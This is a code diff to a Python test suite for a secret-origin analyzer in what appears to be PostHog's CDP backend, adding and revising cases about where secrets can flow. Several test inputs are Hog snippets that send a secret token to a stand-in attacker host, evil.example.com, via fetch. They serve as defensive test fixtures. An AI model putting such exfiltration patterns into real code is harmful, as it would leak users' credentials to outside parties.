@@ -5,6 +5,7 @@ from typing import Any
 from django.test import SimpleTestCase
 
 from parameterized import parameterized
+from prometheus_client import REGISTRY
 
 from products.cdp.backend.secret_origins import UNBOUND, SecretOrigins, secret_origins, url_origin
 
@@ -147,7 +148,7 @@ class TestSecretHosts(SimpleTestCase):
                 "let send := (x) -> fetch('https://evil.example.com', {'body': x})\narrayMap(send, [inputs.token])",
                 _inputs(token="t"),
                 {"token"},
-                {"token": _origins("https://evil.example.com")},
+                {"token": UNBOUND},
             ),
             (
                 "named_lambda_copied_to_another_name",
@@ -155,21 +156,21 @@ class TestSecretHosts(SimpleTestCase):
                 "other(inputs.token)",
                 _inputs(token="t"),
                 {"token"},
-                {"token": _origins("https://evil.example.com")},
+                {"token": UNBOUND},
             ),
             (
                 "lambda_passed_to_a_lambda_that_calls_it_with_a_secret",
                 "let g := (cb) -> cb(inputs.token)\ng((x) -> fetch('https://evil.example.com', {'body': x}))",
                 _inputs(token="t"),
                 {"token"},
-                {"token": _origins("https://evil.example.com")},
+                {"token": UNBOUND},
             ),
             (
                 "lambda_passed_to_a_function_that_calls_it_with_a_secret",
                 "fun g(cb) { cb(inputs.token) }\ng((x) -> fetch('https://evil.example.com', {'body': x}))",
                 _inputs(token="t"),
                 {"token"},
-                {"token": _origins("https://evil.example.com")},
+                {"token": UNBOUND},
             ),
             (
                 "function_passed_by_name_to_a_lambda",
@@ -185,7 +186,7 @@ class TestSecretHosts(SimpleTestCase):
                 "[1, 2], '')",
                 _inputs(token="t"),
                 {"token"},
-                {"token": _origins("https://evil.example.com")},
+                {"token": UNBOUND},
             ),
             (
                 "webhook_template_resolves_secrets_by_key_name",
@@ -248,6 +249,69 @@ class TestSecretHosts(SimpleTestCase):
                 _inputs(token="t"),
                 {"token"},
                 {"token": UNBOUND},
+            ),
+            (
+                "secret_returned_to_a_webhook_caller",
+                "return {'httpResponse': {'status': 200, 'body': inputs.token}}",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "secret_written_into_the_event",
+                "event.properties.salt := inputs.salt",
+                _inputs(salt="s"),
+                {"salt"},
+                {"salt": UNBOUND},
+            ),
+            (
+                "digest_of_a_secret_returned_in_the_event",
+                "let e := event\ne.properties.id := sha256Hex(concat(e.properties.id, inputs.salt))\nreturn e",
+                _inputs(salt="s"),
+                {"salt"},
+                {"salt": _origins()},
+            ),
+            (
+                "secret_quoted_by_a_parse_error",
+                "jsonParse(base64Encode(inputs.token))",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "secret_quoted_by_a_regex_error",
+                "if (event.properties.name =~ inputs.token) { return event }",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "secret_passed_to_an_unknown_worker_function",
+                "postHogNotYetWritten(inputs.token)",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "secret_passed_to_a_called_expression",
+                "let d := {'log': print}\nd.log(inputs.token)",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "secret_quoted_by_an_input_template",
+                "fetch('https://api.example.com', {'headers': {'Authorization': inputs.auth}})",
+                _inputs(auth="{jsonParse(inputs.token)}", token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "response_forwarded_to_another_origin",
+                f"let r := {SENDS_TOKEN_TO_URL}\nfetch('https://evil.example.com', {{'body': r.body}})",
+                _inputs(url="https://hooks.example.com", token="t"),
+                {"token"},
+                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
             ),
             (
                 "input_that_references_a_secret",
@@ -381,6 +445,13 @@ class TestSecretHosts(SimpleTestCase):
                 {"token": _origins()},
             ),
             (
+                "fetch_without_arguments_after_an_aliased_write",
+                "let h := {}\nlet a := h\na.x := inputs.token\nfetch()",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
                 "fetch_to_a_url_from_event_data",
                 "fetch(event.properties.url, {'body': inputs.token})\nfetch(event.properties.url)",
                 _inputs(token="t", salt="s"),
@@ -414,6 +485,14 @@ class TestSecretHosts(SimpleTestCase):
         self, _name: str, hog: str, inputs: dict, secret_keys: set[str], expected: dict[str, SecretOrigins]
     ) -> None:
         assert secret_origins(hog, inputs, [], secret_keys) == expected
+
+    def test_code_too_costly_to_analyze_leaves_its_secrets_unbound(self) -> None:
+        hog = "\n".join(f"let v{index} := concat(inputs.token, 'a', 'b', 'c')" for index in range(3000))
+        labels = {"reason": "budget"}
+        before = REGISTRY.get_sample_value("posthog_cdp_secret_origins_unanalyzable_total", labels) or 0
+
+        assert secret_origins(hog, _inputs(token="t"), [], {"token"}) == {"token": UNBOUND}
+        assert REGISTRY.get_sample_value("posthog_cdp_secret_origins_unanalyzable_total", labels) == before + 1
 
     def test_mapping_inputs_add_their_origins(self) -> None:
         mapping_inputs = [_inputs(url="https://mapped.example.com/a")]
